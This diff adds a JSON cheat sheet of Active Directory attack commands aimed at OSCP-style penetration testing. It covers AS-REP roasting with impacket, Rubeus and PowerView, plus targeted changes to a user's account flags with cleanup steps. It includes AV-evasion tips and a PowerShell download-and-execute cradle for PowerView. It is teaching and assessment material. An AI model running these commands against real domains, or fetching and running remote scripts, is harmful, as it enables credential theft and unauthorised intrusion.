@@ -1,0 +1,345 @@
+{
+  "commands": [
+    {
+      "id": "impacket-getnpusers-asreproast",
+      "name": "impacket-GetNPUsers - AS-REP Roasting Attack",
+      "description": "Extract AS-REP hashes from users with 'Do not require Kerberos preauthentication' enabled (AS-REP Roasting).\nTargets misconfigured accounts to obtain crackable password hashes without authentication.",
+      "command": "impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile <OUTPUT_FILE> <DOMAIN>/<USERNAME>",
+      "category": "password-attacks",
+      "subcategory": "active-directory",
+      "variables": [
+        {
+          "name": "<DC_IP>",
+          "description": "Domain controller IP address",
+          "example": "192.168.50.70",
+          "required": true
+        },
+        {
+          "name": "<OUTPUT_FILE>",
+          "description": "Output file for AS-REP hashes (Hashcat format)",
+          "example": "hashes.asreproast",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Active Directory domain name",
+          "example": "corp.com",
+          "required": true
+        },
+        {
+          "name": "<USERNAME>",
+          "description": "Valid domain username for authentication",
+          "example": "pete",
+          "required": true
+        }
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "AS-REP_ROASTING",
+        "KERBEROS",
+        "LINUX",
+        "IMPACKET",
+        "OSCP:HIGH"
+      ],
+      "flag_explanations": {
+        "-dc-ip": "Domain controller IP - Target DC for AS-REQ requests",
+        "-request": "Request AS-REP hashes - Automatically identify and extract hashes from vulnerable users",
+        "-outputfile": "Save hashes to file in Hashcat-compatible format (mode 18200)",
+        "-format": "Hash format - Options: hashcat (default), john. Use hashcat for mode 18200 compatibility",
+        "-usersfile": "File containing usernames to test (alternative to domain authentication)"
+      },
+      "success_indicators": [
+        "Name",
+        "PasswordLastSet",
+        "UAC",
+        "$krb5asrep$"
+      ],
+      "failure_indicators": [
+        "Kerberos SessionError",
+        "KDC_ERR_C_PRINCIPAL_UNKNOWN",
+        "KRB_AP_ERR_SKEW"
+      ],
+      "next_steps": [
+        "hashcat-crack-asrep",
+        "crackmapexec-validate-admin",
+        "kerbrute-validate-creds"
+      ],
+      "alternatives": [
+        "rubeus-asreproast",
+        "impacket-getnpusers-identify"
+      ],
+      "prerequisites": [],
+      "troubleshooting": {
+        "KRB_AP_ERR_SKEW(Clock skew too great)": "Time sync issue. Solution: sudo ntpdate <DC_IP> OR sudo rdate -n <DC_IP>. Kerberos requires <5 minute time difference between client and DC.",
+        "Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN": "Username or domain incorrect. Verify with: impacket-GetNPUsers -dc-ip <DC_IP> <DOMAIN>/ (no username = list all). Check domain name spelling.",
+        "No entries": "No users have 'Do not require Kerberos preauthentication' enabled. This is DEFAULT (preauthentication required). Try impacket-getnpusers-identify to confirm."
+      },
+      "notes": "AS-REP ROASTING extracts encrypted AS-REP responses from users with Kerberos preauthentication DISABLED.\n\nWHY THIS WORKS:\nWithout preauthentication, you can request AS-REP (TGT response) for any user without knowing their password.\n\nThe AS-REP contains encrypted data using the user's password hash, which can be cracked offline.\n\nDEFAULT SETTING:\nPreauthentication is ENABLED by default (secure).\n\nUsers with preauthentication disabled are rare - typically required for legacy applications or misconfigurations.\n\nATTACK REQUIREMENTS:\n(1) Valid domain credentials (for authenticated query) OR (2) Network access to DC (for unauthenticated username enumeration with -usersfile).\n\nHASH FORMAT:\nOutput is Hashcat mode 18200 compatible.\n\nOSCP TIP:\nAlways try AS-REP roasting early in domain assessment - it's fast (5-30 seconds) and may reveal weak passwords on privileged accounts.\n\nTIME ESTIMATE:\n5-10 seconds for hash extraction + 1-60 minutes for cracking (depends on password complexity).\n\nDETECTION:\nEvent ID 4768 (Kerberos TGT request) - normal traffic, low visibility.\n\nMANUAL ALTERNATIVE:\nUse Rubeus.exe asreproast from Windows for same functionality without authentication requirements (domain-joined system).\n\nTARGETED ATTACK:\nIf you have GenericWrite/GenericAll permissions on a user, you can enable 'Do not require preauthentication', extract hash, crack password, then disable the setting (see targeted-asreproast-set).\n\nClock sync is CRITICAL - use ntpdate or rdate if you receive KRB_AP_ERR_SKEW errors.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "impacket-getnpusers-identify",
+      "name": "impacket-GetNPUsers - Identify Vulnerable Users",
+      "description": "Enumerate users with 'Do not require Kerberos preauthentication' enabled without extracting hashes.\nIdentifies vulnerable accounts before attempting AS-REP Roasting attack.",
+      "command": "impacket-GetNPUsers -dc-ip <DC_IP> <DOMAIN>/<USERNAME>",
+      "category": "enumeration",
+      "subcategory": "active-directory",
+      "variables": [
+        {
+          "name": "<DC_IP>",
+          "description": "Domain controller IP address",
+          "example": "192.168.50.70",
+          "required": true
+        },
+        {
+          "name": "<DOMAIN>",
+          "description": "Active Directory domain name",
+          "example": "corp.com",
+          "required": true
+        },
+        {
+          "name": "<USERNAME>",
+          "description": "Valid domain username (leave empty for unauthenticated enumeration)",
+          "example": "pete",
+          "required": false
+        }
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ENUMERATION",
+        "AS-REP_ROASTING",
+        "KERBEROS",
+        "LINUX",
+        "OSCP:HIGH"
+      ],
+      "flag_explanations": {
+        "-dc-ip": "Domain controller IP",
+        "-no-pass": "Unauthenticated enumeration - No password required (useful for external assessments)"
+      },
+      "success_indicators": [
+        "Name",
+        "MemberOf",
+        "PasswordLastSet",
+        "UAC"
+      ],
+      "failure_indicators": [
+        "No entries",
+        "KDC_ERR_C_PRINCIPAL_UNKNOWN"
+      ],
+      "next_steps": [
+        "impacket-getnpusers-asreproast",
+        "rubeus-asreproast"
+      ],
+      "alternatives": [
+        "powerview-asreproast-identify"
+      ],
+      "prerequisites": [],
+      "troubleshooting": {
+        "No entries": "No users have preauthentication disabled. This is expected - AS-REP roasting requires misconfigured accounts. Focus on other attack vectors.",
+        "Clock skew error": "Time sync required: sudo ntpdate <DC_IP>"
+      },
+      "notes": "IDENTIFICATION ONLY - lists vulnerable users without requesting hashes.\n\nUse this for:\n(1) Reconnaissance before attack.\n\n(2) Verifying users exist.\n\n(3) Checking if AS-REP roasting is viable.\n\nOUTPUT COLUMNS:\nName (username), MemberOf (group membership - look for admin groups), PasswordLastSet (old passwords = easier to crack), LastLogon (active account check), UAC (User Account Control flags - 0x410200 = preauthentication disabled).\n\nUNAUTHENTICATED MODE:\nOmit username or use -no-pass flag to enumerate without credentials (rare - most domains require authentication).\n\nOSCP STRATEGY:\nRun this BEFORE extracting hashes to:\n(1) Identify high-value targets (Domain Admins, privileged accounts).\n\n(2) Estimate attack surface (10 vulnerable users vs 1).\n\n(3) Prioritize targets by PasswordLastSet date.\n\nTIME ESTIMATE:\n<5 seconds.\n\nNO HASH EXTRACTION:\nAdd -request flag to extract hashes (see impacket-getnpusers-asreproast).\n\nDETECTION:\nMinimal - standard LDAP queries, Event ID 4662 (LDAP query) - normal enumeration traffic.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "rubeus-asreproast",
+      "name": "Rubeus - AS-REP Roasting (Windows)",
+      "description": "Extract AS-REP hashes from Windows domain-joined system using Rubeus.\nNative Windows alternative to impacket-GetNPUsers with automatic domain context.",
+      "command": ".\\Rubeus.exe asreproast /nowrap",
+      "category": "password-attacks",
+      "subcategory": "active-directory",
+      "variables": [],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "AS-REP_ROASTING",
+        "KERBEROS",
+        "WINDOWS",
+        "RUBEUS",
+        "OSCP:HIGH"
+      ],
+      "flag_explanations": {
+        "asreproast": "AS-REP roasting mode - Automatically find and extract hashes from vulnerable users",
+        "/nowrap": "Disable line wrapping in hash output - CRITICAL for Hashcat compatibility (prevents newlines in hash)",
+        "/format": "Output format - Options: hashcat (default), john. Use hashcat for mode 18200",
+        "/user": "Target specific user - Syntax: /user:username (useful if you know vulnerable account)",
+        "/domain": "Specify domain - Auto-detected from current domain context if omitted",
+        "/dc": "Domain controller - Specify DC if multiple DCs exist: /dc:DC1.corp.com",
+        "/outfile": "Save to file - Syntax: /outfile:C:\\hashes.txt"
+      },
+      "success_indicators": [
+        "SamAccountName",
+        "DistinguishedName",
+        "AS-REP hash:",
+        "$krb5asrep$"
+      ],
+      "failure_indicators": [
+        "No users found",
+        "Access denied",
+        "Unhandled Rubeus exception"
+      ],
+      "next_steps": [
+        "hashcat-crack-asrep"
+      ],
+      "alternatives": [
+        "impacket-getnpusers-asreproast"
+      ],
+      "prerequisites": [],
+      "troubleshooting": {
+        "No users found": "No accounts with preauthentication disabled. Expected - this is the secure default. Confirm with: .\\Rubeus.exe asreproast (no flags).",
+        "Access denied": "Need domain user context. Solution: Run from domain-joined Windows system as authenticated user OR use runas: runas /netonly /user:<DOMAIN>\\<USER> cmd.exe",
+        "Unhandled Rubeus exception": "Rubeus version incompatibility or AV detection. Try: (1) Re-download latest Rubeus. (2) Obfuscate binary. (3) Use impacket-GetNPUsers from Linux instead."
+      },
+      "notes": "WINDOWS-BASED AS-REP ROASTING using Rubeus.exe.\n\nADVANTAGES OVER IMPACKET:\n(1) No credentials required (uses current domain user context automatically).\n\n(2) Faster from Windows (native Kerberos API).\n\n(3) No time sync issues.\n\n(4) Auto-discovers domain info.\n\nCRITICAL:\nUse /nowrap flag to prevent line breaks in hash output - Hashcat requires single-line format.\n\nWithout /nowrap, hash will span multiple lines and fail to crack.\n\nEXECUTION CONTEXT:\nMust run from domain-joined Windows system OR use runas /netonly.\n\nTOOL LOCATION:\nRubeus.exe typically in C:\\Tools\\ on OSCP lab systems.\n\nDownload from:\nhttps://github.com/GhostPack/Rubeus.\n\nHASH OUTPUT:\nDefault format is Hashcat mode 18200 compatible.\n\nOSCP TIP:\nRubeus is preferred when you have RDP/WinRM access to Windows box.\n\nNo time sync needed, no credential entry required (uses current session).\n\nTIME ESTIMATE:\n5-10 seconds for hash extraction.\n\nAV EVASION:\nRubeus is flagged by Windows Defender.\n\nOptions:\n(1) Disable AV temporarily.\n\n(2) Use obfuscated version.\n\n(3) Reflectively load in memory.\n\n(4) Fall back to impacket-GetNPUsers from Linux.\n\nOUTPUT PARSING:\nCopy hash starting from $krb5asrep$ to end (single line with /nowrap).\n\nDETECTION:\nEvent ID 4768 (TGT request) - standard Kerberos traffic, low visibility.\n\nMULTIPLE USERS:\nRubeus automatically finds ALL vulnerable users and displays hashes sequentially.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "powerview-asreproast-identify",
+      "name": "PowerView - Identify AS-REP Roastable Users",
+      "description": "Use PowerView to enumerate users with Kerberos preauthentication disabled.\nPowerShell-based identification of AS-REP Roasting targets with detailed attribute filtering.",
+      "command": "Get-DomainUser -PreauthNotRequired -Properties samaccountname,memberof,pwdlastset",
+      "category": "enumeration",
+      "subcategory": "active-directory",
+      "variables": [],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "ENUMERATION",
+        "AS-REP_ROASTING",
+        "POWERSHELL",
+        "POWERVIEW",
+        "WINDOWS",
+        "OSCP:HIGH"
+      ],
+      "flag_explanations": {
+        "-PreauthNotRequired": "Filter for users with 'DONT_REQ_PREAUTH' UAC flag (AS-REP roastable)",
+        "-Properties": "Specify properties to retrieve - Useful properties: samaccountname (username), memberof (groups), pwdlastset (password age), lastlogon (activity), admincount (privileged account indicator)",
+        "-Identity": "Target specific user - Syntax: -Identity username",
+        "-LDAPFilter": "Custom LDAP filter - Advanced users only",
+        "-Server": "Specify domain controller - Syntax: -Server DC1.corp.com"
+      },
+      "success_indicators": [
+        "samaccountname",
+        "memberof",
+        "pwdlastset"
+      ],
+      "failure_indicators": [
+        "Access denied",
+        "Get-DomainUser : The term 'Get-DomainUser' is not recognized"
+      ],
+      "next_steps": [
+        "rubeus-asreproast",
+        "impacket-getnpusers-asreproast"
+      ],
+      "alternatives": [
+        "impacket-getnpusers-identify"
+      ],
+      "prerequisites": [],
+      "troubleshooting": {
+        "Get-DomainUser not recognized": "PowerView not loaded. Solution: Import-Module C:\\Tools\\PowerView.ps1 OR download: IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')",
+        "Access denied": "Requires domain user context. Run from domain-joined system or use runas /netonly",
+        "No output": "No vulnerable users found. This is expected - preauthentication disabled is rare (insecure configuration)."
+      },
+      "notes": "POWERVIEW ENUMERATION for AS-REP roastable users.\n\nIDENTIFICATION ONLY - does not extract hashes (use Rubeus or impacket for extraction).\n\nWHY POWERVIEW:\n(1) Rich filtering options.\n\n(2) Detailed user attributes.\n\n(3) Integrated with other PowerView cmdlets for further enumeration.\n\nOUTPUT ANALYSIS:\npwdlastset (old dates = weak password likely), memberof (look for 'Domain Admins', 'Enterprise Admins', privileged groups), admincount=1 (privileged account).\n\nPOWERVIEW LOCATION:\nC:\\Tools\\PowerView.ps1 on lab systems OR download from PowerSploit GitHub.\n\nIMPORT METHOD:\nImport-Module .\\PowerView.ps1 OR dot-source:\n.\n\n.\\PowerView.ps1.\n\nEXECUTION POLICY:\nMay need -ExecutionPolicy Bypass:\npowershell -ep bypass -c 'Import-Module .\\PowerView.ps1; Get-DomainUser -PreauthNotRequired'.\n\nALTERNATIVE SYNTAX:\nGet-NetUser -PreauthNotRequired (older PowerView alias, same functionality).\n\nOSCP TIP:\nCombine with other PowerView cmdlets for comprehensive enumeration:\nGet-DomainUser -PreauthNotRequired | Get-DomainGroup (find groups), Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,pwdlastset | Sort-Object pwdlastset (sort by password age - oldest = easiest targets).\n\nUAC FLAG:\nThe 'DONT_REQ_PREAUTH' flag is 0x400000 in userAccountControl attribute.\n\nTIME ESTIMATE:\n<5 seconds for enumeration.\n\nNEXT STEP:\nUse Rubeus or impacket-GetNPUsers to extract hashes for identified users.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "targeted-asreproast-set",
+      "name": "Targeted AS-REP Roasting - Enable DONT_REQ_PREAUTH",
+      "description": "Set 'Do not require Kerberos preauthentication' on user account for targeted AS-REP roasting.\nRequires GenericWrite/GenericAll permissions - enables hash extraction on arbitrary accounts.",
+      "command": "Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose",
+      "category": "privilege-escalation",
+      "subcategory": "active-directory",
+      "variables": [
+        {
+          "name": "<USERNAME>",
+          "description": "Target username to enable preauthentication bypass",
+          "example": "targetuser",
+          "required": true
+        }
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "PRIVILEGE_ESCALATION",
+        "AS-REP_ROASTING",
+        "TARGETED_ATTACK",
+        "POWERVIEW",
+        "WINDOWS",
+        "OSCP:MEDIUM"
+      ],
+      "flag_explanations": {
+        "-Identity": "Target user account",
+        "-XOR": "XOR operation on userAccountControl - 4194304 is the DONT_REQ_PREAUTH flag (0x400000). XOR toggles the flag without affecting other UAC bits.",
+        "-Verbose": "Show detailed output for confirmation",
+        "-Set": "Alternative to -XOR - Directly set UAC value (more dangerous, can overwrite other flags)"
+      },
+      "success_indicators": [
+        "useraccountcontrol set",
+        "Success"
+      ],
+      "failure_indicators": [
+        "Access denied",
+        "Insufficient access rights"
+      ],
+      "next_steps": [
+        "rubeus-asreproast",
+        "impacket-getnpusers-asreproast",
+        "targeted-asreproast-cleanup"
+      ],
+      "alternatives": [],
+      "prerequisites": [],
+      "troubleshooting": {
+        "Access denied": "Missing GenericWrite/GenericAll permissions on target user. Verify: Get-DomainObjectAcl -Identity <USERNAME> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericWrite|GenericAll'}",
+        "Set-DomainObject not recognized": "PowerView not loaded. Import: Import-Module .\\PowerView.ps1"
+      },
+      "notes": "TARGETED AS-REP ROASTING attack for scenarios where no users have preauthentication disabled by default.\n\nREQUIREMENTS:\nGenericWrite OR GenericAll permissions on target user account.\n\nATTACK FLOW:\n(1) Identify user you have write permissions on.\n\n(2) Enable DONT_REQ_PREAUTH flag.\n\n(3) Extract AS-REP hash with Rubeus/impacket.\n\n(4) Crack hash offline.\n\n(5) CLEANUP:\nReset UAC to original value (CRITICAL - see targeted-asreproast-cleanup).\n\nUAC FLAG:\n4194304 decimal = 0x400000 hex = DONT_REQ_PREAUTH bit.\n\nXOR operation toggles this bit without modifying other UAC flags (safer than -Set).\n\nETHICAL NOTE:\nThis modifies production AD and temporarily weakens security.\n\nALWAYS reset UAC after obtaining hash.\n\nDocument changes in assessment notes.\n\nOSCP SCENARIO:\nCommon in environments with delegated permissions, service account management, or misconfigured ACLs.\n\nPERMISSION CHECK:\nGet-DomainObjectAcl -Identity <USERNAME> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq (whoami /user)[1]} | ? {$_.ActiveDirectoryRights -match 'GenericWrite|GenericAll'}.\n\nTIME ESTIMATE:\n5 seconds to set flag + 5 seconds to extract hash + 1-60 minutes to crack.\n\nDETECTION:\nEvent ID 4738 (user account changed) - shows userAccountControl modification.\n\nHighly suspicious if DONT_REQ_PREAUTH enabled on production account.\n\nCLEANUP CRITICAL:\nFailing to reset UAC leaves account vulnerable.\n\nSet reminder or use script to auto-reset after 30 minutes.\n\nALTERNATIVE METHODS:\n(1) Reset password (more obvious, locks out user).\n\n(2) Add SPN for Kerberoasting (see targeted-kerberoast-set).\n\n(3) Modify group membership (requires different permissions).",
+      "oscp_relevance": "medium"
+    },
+    {
+      "id": "targeted-asreproast-cleanup",
+      "name": "Targeted AS-REP Roasting - Reset UAC (Cleanup)",
+      "description": "Remove 'Do not require Kerberos preauthentication' flag after targeted AS-REP roasting attack.\nCritical cleanup step to restore account security configuration after exploitation.",
+      "command": "Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose",
+      "category": "cleanup",
+      "subcategory": "active-directory",
+      "variables": [
+        {
+          "name": "<USERNAME>",
+          "description": "User account to reset (same as targeted-asreproast-set)",
+          "example": "targetuser",
+          "required": true
+        }
+      ],
+      "tags": [
+        "ACTIVE_DIRECTORY",
+        "CLEANUP",
+        "AS-REP_ROASTING",
+        "TARGETED_ATTACK",
+        "POWERVIEW",
+        "WINDOWS",
+        "OSCP:HIGH"
+      ],
+      "flag_explanations": {
+        "-Identity": "Target user account",
+        "-XOR": "XOR operation toggles DONT_REQ_PREAUTH flag back to disabled (same command as set - XOR is reversible)",
+        "-Verbose": "Confirm flag removed"
+      },
+      "success_indicators": [
+        "useraccountcontrol set",
+        "Success"
+      ],
+      "failure_indicators": [
+        "Access denied"
+      ],
+      "next_steps": [],
+      "alternatives": [],
+      "prerequisites": [
+        "targeted-asreproast-set"
+      ],
+      "troubleshooting": {
+        "Access denied": "Lost permissions or user account locked. Escalate to domain admin or notify client.",
+        "How to verify flag removed": "Get-DomainUser -Identity <USERNAME> -Properties useraccountcontrol. Verify DONT_REQ_PREAUTH flag not present (UAC should be 512 or 544 for normal user, not 4194816)."
+      },
+      "notes": "CRITICAL CLEANUP STEP after targeted AS-REP roasting.\n\nXOR OPERATION IS REVERSIBLE:\nSame command that enabled DONT_REQ_PREAUTH also disables it (XOR toggles bit).\n\nVERIFICATION:\nGet-DomainUser -Identity <USERNAME> -Properties useraccountcontrol | Select-Object useraccountcontrol.\n\nNormal UAC values:\n512 (enabled account), 544 (password not required - disabled), 66048 (disabled account).\n\nValues with 4194304 added indicate DONT_REQ_PREAUTH enabled.\n\nOSCP REQUIREMENT:\nAlways document cleanup steps in assessment report.\n\nShow before/after UAC values as evidence of proper cleanup.\n\nAUTOMATION:\nCreate script to auto-reset after 30 minutes:\nStart-Sleep -Seconds 1800; Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304}.\n\nTIME TO CLEANUP:\n<5 seconds.\n\nWHY CLEANUP MATTERS:\n(1) Ethical requirement - don't leave client environment more vulnerable.\n\n(2) Detection - prolonged DONT_REQ_PREAUTH on account triggers alerts.\n\n(3) Compliance - required for professional pentesting certifications.\n\nFAILED CLEANUP:\nIf you lose access before cleanup, document in report and notify client immediately.\n\nProvide manual cleanup steps:\nOpen ADUC → Find user → Properties → Account tab → Uncheck 'Do not require Kerberos preauthentication'.\n\nVERIFICATION COMMAND:\n(Get-DomainUser -Identity <USERNAME> -Properties useraccountcontrol).useraccountcontrol -band 4194304 (should return 0 after cleanup).",
+      "oscp_relevance": "high"
+    }
+  ]
+}
